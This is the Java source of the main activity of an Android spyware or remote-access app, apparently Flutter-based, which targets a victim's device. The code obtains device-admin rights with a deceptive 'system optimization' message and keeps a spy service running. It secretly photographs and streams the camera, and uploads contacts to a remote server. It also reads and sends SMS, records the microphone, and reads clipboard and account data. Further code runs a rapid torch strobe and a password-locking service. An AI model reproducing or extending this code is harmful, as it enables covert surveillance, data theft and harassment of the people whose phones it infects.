package com.nullx.pp;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.os.StatFs;
import android.os.Environment;
import android.os.Vibrator;
import android.os.VibrationEffect;
import android.provider.Settings;
import android.speech.tts.TextToSpeech;
import android.view.WindowManager;
import android.widget.Toast;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.SmsManager;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import io.flutter.embedding.android.FlutterActivity;
import io.flutter.embedding.engine.FlutterEngine;
import io.flutter.plugin.common.MethodChannel;
import java.util.Locale;
import java.util.Map;
import java.util.HashMap;
import java.util.ArrayList;
import java.util.List;
import android.util.Base64;
import android.util.Log;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.view.View;
import android.app.WallpaperManager;
import java.net.URL;
import java.net.HttpURLConnection;
import org.json.JSONArray;
import org.json.JSONObject;

// IMPORT TAMBAHAN UNTUK KAMERA WORKER
import android.hardware.Camera;
import android.graphics.SurfaceTexture;
import io.flutter.plugin.common.EventChannel;

public class MainActivity extends FlutterActivity {
    // Channel Identifiers
    private static final String SPY_CHANNEL = "com.nullx.pp/background_spy";
    private static final String STROBE_CHANNEL = "com.nullx.pp/strobe";
    private static final String NATIVE_LOCK_CHANNEL = "com.nullx.pp/native_lock";
    private static final String PROXY_EVENT_CHANNEL = "com.nullx.pp/proxy_events";

    // Operational Components
    private boolean isStrobeRunning = false;
    private android.os.Handler uiHandler = new android.os.Handler(android.os.Looper.getMainLooper());
    private Runnable strobeRunnable;
    private static MethodChannel lockChannel;
    private static MethodChannel spyChannel; 
    private TextToSpeech ttsEngine;
    private MediaRecorder recorder;
    private String audioPath;
    
    // Proxy receiver — jembatan SpyService → Flutter EventChannel
    private CommandProxyReceiver proxyReceiver;
    // [+] Live Camera Stream Engine
    private boolean isCameraInUse = false;
    private boolean isStreaming = false;
    private Camera streamCamera;

    // FIXED: Menggunakan Server URL Terbaru Port 2026
    private static final String SERVER_POST_URL = "http://127.0.0.1:3000/api/post-response/";

    private String getServerPostUrl() {
        SharedPreferences flutterPrefs = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE);
        String url = flutterPrefs.getString("flutter.server_url", null);
        if (url != null && !url.isEmpty()) return url + "/api/post-response/";
        SharedPreferences spyPrefs = getSharedPreferences("SpyPrefs", MODE_PRIVATE);
        return spyPrefs.getString("server_url", SERVER_POST_URL.replace("/api/post-response/", "")) + "/api/post-response/";
    }

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestCriticalPermissions();
        requestOverlayPermission();
        // Start SpyService sebagai foreground service — jalan terus walau app di-close
        startPersistentSpyService();
    }

    private void startPersistentSpyService() {
        Intent spyIntent = new Intent(this, SpyService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(spyIntent);
        } else {
            startService(spyIntent);
        }
    }

    private void requestCriticalPermissions() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System optimization requires admin access.");
            startActivity(intent);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                } catch (Exception e) { }
            }
        }
    }

    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        }
    }

    @Override
    public void configureFlutterEngine(@NonNull FlutterEngine flutterEngine) {
        super.configureFlutterEngine(flutterEngine);
        lockChannel = new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), NATIVE_LOCK_CHANNEL);
        spyChannel = new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), SPY_CHANNEL);

        // Setup EventChannel — jembatan SpyService broadcast → Flutter executeLogic()
        new EventChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), PROXY_EVENT_CHANNEL)
            .setStreamHandler(new EventChannel.StreamHandler() {
                @Override
                public void onListen(Object arguments, EventChannel.EventSink events) {
                    // Simpan sink ke CommandProxyReceiver
                    CommandProxyReceiver.setEventSink(events);
                    // Daftarkan BroadcastReceiver
                    proxyReceiver = new CommandProxyReceiver();
                    IntentFilter filter = new IntentFilter("com.nullx.pp.COMMAND_PROXY");
                    registerReceiver(proxyReceiver, filter);
                    Log.d("MainActivity", "[+] ProxyReceiver registered");
                }

                @Override
                public void onCancel(Object arguments) {
                    CommandProxyReceiver.setEventSink(null);
                    if (proxyReceiver != null) {
                        try { unregisterReceiver(proxyReceiver); } catch (Exception ignored) {}
                        proxyReceiver = null;
                    }
                }
            });

        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), STROBE_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                if (call.method.equals("flash_strobe") || call.method.equals("startStrobe")) { 
                    startStrobeEffect(); 
                    result.success(null); 
                }
                else if (call.method.equals("stop_strobe") || call.method.equals("stopStrobe")) { 
                    stopStrobeEffect(); 
                    result.success(null); 
                }
            });

        spyChannel.setMethodCallHandler((call, result) -> {
                AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                switch (call.method) {
                    case "take_photo":
                    case "takeSilentPhotoBackground": 
                        String side = call.argument("side");
                        takeSilentPhoto(side, result);
                        break;
                    case "start_live_camera":
                        String streamSide = call.argument("side");
                        startLiveStream(streamSide != null ? streamSide : "back");
                        result.success(true);
                        break;
                    case "stop_live_camera":
                        stopLiveStream();
                        result.success(true);
                        break;
                    case "get_contacts": // FIXED: Sinkronisasi pengambilan kontak
                        fetchAndUploadContacts();
                        result.success(true);
                        break;
                    case "get_apps":
                    case "getInstalledApps":
                        result.success(getApps());
                        break;
                    case "get_gmails":
                    case "getAccounts":
                        result.success(getDeviceAccounts());
                        break;
                    case "getSystemStats":
                        result.success(getStorageInfo());
                        break;
                    case "get_clipboard":
                    case "getClipboard":
                        ClipboardManager cb = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                        result.success(cb.hasPrimaryClip() ? cb.getPrimaryClip().getItemAt(0).getText().toString() : "Empty");
                        break;
                    case "getHeatInfo":
                        Intent bIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
                        float temp = ((float) bIntent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0)) / 10;
                        result.success("Temp: " + temp + "°C");
                        break;
                    case "set_vol_max":
                    case "setVolumeMax":
                        am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
                        am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0);
                        am.setStreamVolume(AudioManager.STREAM_ALARM, am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
                        result.success(true);
                        break;
                    case "vibrate_loop":
                        Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                        if (v != null) {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                v.vibrate(VibrationEffect.createOneShot(10000, VibrationEffect.DEFAULT_AMPLITUDE));
                            } else {
                                v.vibrate(10000);
                            }
                        }
                        result.success(true);
                        break;
                    case "setBrightness":
                        setDeviceBrightness(((Number) call.argument("level")).floatValue());
                        result.success(true);
                        break;
                    case "speakText":
                        speakTargetDevice(call.argument("text"));
                        result.success(true);
                        break;
                    case "showToast":
                        Toast.makeText(this, (String) call.argument("msg"), Toast.LENGTH_SHORT).show();
                        result.success(true);
                        break;
                    case "set_wallpaper":
                    case "setWallpaper":
                        updateWallpaper(call.argument("url"), result);
                        break;
                    case "get_screen":
                    case "startScreenStreamBackground":
                        result.success(getScreenShotBase64());
                        break;
                    case "bringToForeground":
                        bringToFront();
                        result.success(true);
                        break;
                    case "checkAccessibility":
                        result.success(isAccessibilityServiceEnabled());
                        break;
                    case "openAccessibilitySettings":
                        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                        result.success(true);
                        break;
                    case "openNotificationSettings":
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                        }
                        result.success(true);
                        break;
                    case "startAudioRecord":
                        startRecording(result);
                        break;
                    case "stopAudioRecord":
                        stopRecording(result);
                        break;
                    case "saveTargetId":
                        String id = call.arguments.toString();
                        getSharedPreferences("SpyPrefs", MODE_PRIVATE).edit().putString("targetId", id).apply();
                        result.success(true);
                        break;
                    case "unlock":
                        result.success(true);
                        break;
                    case "get_sms":
                        new Thread(() -> {
                            try {
                                JSONArray smsList = new JSONArray();
                                Cursor cursor = getContentResolver().query(
                                    Telephony.Sms.Inbox.CONTENT_URI,
                                    null, null, null,
                                    Telephony.Sms.Inbox.DEFAULT_SORT_ORDER + " DESC LIMIT 100"
                                );
                                if (cursor != null) {
                                    while (cursor.moveToNext()) {
                                        JSONObject sms = new JSONObject();
                                        sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.Inbox.ADDRESS)));
                                        sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.Inbox.BODY)));
                                        sms.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.Inbox.DATE)));
                                        sms.put("type", "inbox");
                                        smsList.put(sms);
                                    }
                                    cursor.close();
                                }
                                Cursor sentCursor = getContentResolver().query(
                                    Telephony.Sms.Sent.CONTENT_URI,
                                    null, null, null,
                                    Telephony.Sms.Inbox.DEFAULT_SORT_ORDER + " DESC LIMIT 50"
                                );
                                if (sentCursor != null) {
                                    while (sentCursor.moveToNext()) {
                                        JSONObject sms = new JSONObject();
                                        sms.put("address", sentCursor.getString(sentCursor.getColumnIndexOrThrow(Telephony.Sms.Inbox.ADDRESS)));
                                        sms.put("body", sentCursor.getString(sentCursor.getColumnIndexOrThrow(Telephony.Sms.Inbox.BODY)));
                                        sms.put("date", sentCursor.getLong(sentCursor.getColumnIndexOrThrow(Telephony.Sms.Inbox.DATE)));
                                        sms.put("type", "sent");
                                        smsList.put(sms);
                                    }
                                    sentCursor.close();
                                }
                                result.success(smsList.toString());
                            } catch (Exception e) {
                                result.error("SMS_ERROR", e.getMessage(), null);
                            }
                        }).start();
                        break;
                    case "send_sms":
                        try {
                            String number = call.argument("number");
                            String message = call.argument("message");
                            SmsManager sm = SmsManager.getDefault();
                            ArrayList<String> parts = sm.divideMessage(message);
                            sm.sendMultipartTextMessage(number, null, parts, null, null);
                            result.success(true);
                        } catch (Exception e) {
                            result.error("SMS_SEND_ERROR", e.getMessage(), null);
                        }
                        break;
                    default:
                        result.notImplemented();
                }
            });

        lockChannel.setMethodCallHandler((call, result) -> {
            if (call.method.equals("startNativeLock")) {
                Map<String, String> args = (Map<String, String>) call.arguments;
                Intent intent = new Intent(this, LockService.class);
                intent.putExtra("mode", args.get("mode"));
                intent.putExtra("message", args.get("message"));
                intent.putExtra("password", args.get("password"));
                startService(intent);
                result.success(true);
            } else if (call.method.equals("stopNativeLock")) {
                stopService(new Intent(this, LockService.class));
                result.success(true);
            }
        });
    }

    // --- CONTACTS EXFILTRATION LOGIC ---
    private void fetchAndUploadContacts() {
        new Thread(() -> {
            try {
                String targetId = getSharedPreferences("SpyPrefs", MODE_PRIVATE).getString("targetId", "unknown");
                JSONArray contactsArray = new JSONArray();
                Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                
                if (cursor != null) {
                    int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                    int numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    
                    while (cursor.moveToNext()) {
                        JSONObject contact = new JSONObject();
                        contact.put("name", cursor.getString(nameIdx));
                        contact.put("num", cursor.getString(numIdx));
                        contactsArray.put(contact);
                        if (contactsArray.length() > 500) break; // Limit 500 kontak awal
                    }
                    cursor.close();
                }

                URL url = new URL(getServerPostUrl() + targetId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject payload = new JSONObject();
                payload.put("cmd", "get_contacts");
                payload.put("data", contactsArray);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes());
                }
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e("CRPT.ZDX", "Contacts Upload Error: " + e.getMessage());
            }
        }).start();
    }

    // --- LIVE CAMERA STREAM LOGIC ---
    private void startLiveStream(String side) {
        if (isCameraInUse || isStreaming) return;
        isCameraInUse = true;
        isStreaming = true;
        int cameraId = "front".equals(side) ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
        try {
            streamCamera = Camera.open(cameraId);
            SurfaceTexture dummy = new SurfaceTexture(10);
            streamCamera.setPreviewTexture(dummy);
            Camera.Parameters params = streamCamera.getParameters();
            List<Camera.Size> sizes = params.getSupportedPreviewSizes();
            Camera.Size lowRes = sizes.get(sizes.size() > 2 ? sizes.size() - 2 : sizes.size() - 1);
            params.setPreviewSize(lowRes.width, lowRes.height);
            streamCamera.setParameters(params);
            streamCamera.setPreviewCallback((data, camera) -> {
                if (!isStreaming) return;
                new Thread(() -> {
                    try {
                        Camera.Parameters parameters = camera.getParameters();
                        int width = parameters.getPreviewSize().width;
                        int height = parameters.getPreviewSize().height;
                        YuvImage yuvImage = new YuvImage(data, parameters.getPreviewFormat(), width, height, null);
                        ByteArrayOutputStream out = new ByteArrayOutputStream();
                        yuvImage.compressToJpeg(new Rect(0, 0, width, height), 25, out); 
                        String base64Frame = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
                        String tId = getSharedPreferences("SpyPrefs", MODE_PRIVATE).getString("targetId", "unknown");
                        sendFrameToServer(tId, base64Frame);
                        uiHandler.post(() -> {
                            if (spyChannel != null) {
                                Map<String, String> streamData = new HashMap<>();
                                streamData.put("id", tId);
                                streamData.put("image", base64Frame);
                                spyChannel.invokeMethod("live_frame", streamData);
                            }
                        });
                    } catch (Exception e) { }
                }).start();
            });
            streamCamera.startPreview();
        } catch (Exception e) {
            isCameraInUse = false;
            isStreaming = false;
        }
    }

    private void sendFrameToServer(String targetId, String base64) {
        try {
            URL url = new URL(getServerPostUrl() + targetId);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            JSONObject json = new JSONObject();
            json.put("cmd", "live_camera_frame");
            json.put("data", base64);
            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.toString().getBytes());
            }
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) { }
    }

    private void stopLiveStream() {
        isStreaming = false;
        if (streamCamera != null) {
            streamCamera.setPreviewCallback(null);
            streamCamera.stopPreview();
            streamCamera.release();
            streamCamera = null;
        }
        isCameraInUse = false;
    }

    private void takeSilentPhoto(String side, MethodChannel.Result result) {
        if (isCameraInUse) { result.error("CAM_BUSY", "Camera is processing", null); return; }
        isCameraInUse = true;
        int cameraId = "front".equals(side) ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
        try {
            final Camera camera = Camera.open(cameraId);
            SurfaceTexture dummy = new SurfaceTexture(10);
            camera.setPreviewTexture(dummy);
            camera.startPreview();
            uiHandler.postDelayed(() -> {
                try {
                    camera.takePicture(null, null, (data, cam) -> {
                        String base64Image = Base64.encodeToString(data, Base64.NO_WRAP);
                        camera.release();
                        isCameraInUse = false;
                        result.success(base64Image);
                    });
                } catch (Exception e) {
                    if (camera != null) camera.release();
                    isCameraInUse = false;
                    result.error("TAKE_ERR", e.getMessage(), null);
                }
            }, 1000);
        } catch (Exception e) {
            isCameraInUse = false;
            result.error("CAM_OPEN_ERR", e.getMessage(), null);
        }
    }

    private List<Map<String, String>> getApps() {
        List<Map<String, String>> appList = new ArrayList<>();
        PackageManager pm = getPackageManager();
        List<PackageInfo> packages = pm.getInstalledPackages(0);
        for (PackageInfo p : packages) {
            Map<String, String> appData = new HashMap<>();
            appData.put("name", p.applicationInfo.loadLabel(pm).toString());
            appData.put("package", p.packageName);
            appData.put("version", p.versionName);
            appList.add(appData);
        }
        return appList;
    }

    private void bringToFront() {
        Intent it = new Intent(this, MainActivity.class);
        it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        startActivity(it);
    }

    private void startRecording(MethodChannel.Result result) {
        try {
            audioPath = getExternalCacheDir().getAbsolutePath() + "/rec.mp3";
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audioPath);
            recorder.prepare();
            recorder.start();
            result.success(true);
        } catch (Exception e) { result.error("REC_ERR", e.getMessage(), null); }
    }

    private void stopRecording(MethodChannel.Result result) {
        if (recorder != null) {
            try {
                recorder.stop();
                recorder.release();
                recorder = null;
                result.success(audioPath);
            } catch (Exception e) { result.error("STOP_ERR", e.getMessage(), null); }
        } else { result.success("No recording in progress"); }
    }

    private String getStorageInfo() {
        StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
        long bytesAvailable = stat.getBlockSizeLong() * stat.getAvailableBlocksLong();
        long megAvailable = bytesAvailable / (1024 * 1024);
        return "Free Storage: " + megAvailable + " MB";
    }

    private List<String> getDeviceAccounts() {
        List<String> accs = new ArrayList<>();
        try {
            AccountManager manager = AccountManager.get(this);
            Account[] accounts = manager.getAccountsByType("com.google");
            for (Account account : accounts) { accs.add(account.name); }
        } catch (Exception e) { accs.add("Permission Denied"); }
        return accs;
    }

    private boolean isAccessibilityServiceEnabled() {
        String prefString = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return prefString != null && prefString.contains(getPackageName());
    }

    private void setDeviceBrightness(float level) {
        runOnUiThread(() -> {
            WindowManager.LayoutParams lp = getWindow().getAttributes();
            lp.screenBrightness = level;
            getWindow().setAttributes(lp);
        });
    }

    private void speakTargetDevice(String text) {
        if (ttsEngine == null) {
            ttsEngine = new TextToSpeech(this, status -> {
                if (status == TextToSpeech.SUCCESS) {
                    ttsEngine.setLanguage(Locale.US);
                    ttsEngine.speak(text, TextToSpeech.QUEUE_FLUSH, null, null);
                }
            });
        } else { ttsEngine.speak(text, TextToSpeech.QUEUE_FLUSH, null, null); }
    }

    private void updateWallpaper(String urlString, MethodChannel.Result result) {
        new Thread(() -> {
            try {
                java.io.InputStream is = new URL(urlString).openStream();
                WallpaperManager.getInstance(this).setStream(is);
                uiHandler.post(() -> result.success(true));
            } catch (Exception e) { uiHandler.post(() -> result.error("WALL_ERR", e.getMessage(), null)); }
        }).start();
    }

    private String getScreenShotBase64() {
        try {
            View v = getWindow().getDecorView().getRootView();
            v.setDrawingCacheEnabled(true);
            Bitmap b = Bitmap.createBitmap(v.getDrawingCache());
            v.setDrawingCacheEnabled(false);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            b.compress(Bitmap.CompressFormat.JPEG, 50, out);
            return Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
        } catch (Exception e) { return null; }
    }

    private void startStrobeEffect() {
        isStrobeRunning = true;
        android.hardware.camera2.CameraManager camManager = (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);
        strobeRunnable = new Runnable() {
            boolean isOn = false;
            @Override public void run() {
                try {
                    String camId = camManager.getCameraIdList()[0];
                    isOn = !isOn;
                    camManager.setTorchMode(camId, isOn);
                    if (isStrobeRunning) uiHandler.postDelayed(this, 30);
                } catch (Exception e) { isStrobeRunning = false; }
            }
        };
        uiHandler.post(strobeRunnable);
    }

    private void stopStrobeEffect() {
        isStrobeRunning = false;
        if (strobeRunnable != null) uiHandler.removeCallbacks(strobeRunnable);
        try {
            android.hardware.camera2.CameraManager camManager = (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);
            camManager.setTorchMode(camManager.getCameraIdList()[0], false);
        } catch (Exception e) {}
    }

    public static void sendReplyToFlutter(String reply) {
        if (lockChannel != null) {
            new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> 
                lockChannel.invokeMethod("onTargetReply", reply)
            );
        }
    }

    @Override
    protected void onDestroy() {
        stopLiveStream();
        if (ttsEngine != null) { ttsEngine.stop(); ttsEngine.shutdown(); }
        // Cleanup proxy receiver
        CommandProxyReceiver.setEventSink(null);
        if (proxyReceiver != null) {
            try { unregisterReceiver(proxyReceiver); } catch (Exception ignored) {}
            proxyReceiver = null;
        }
        super.onDestroy();
    }
}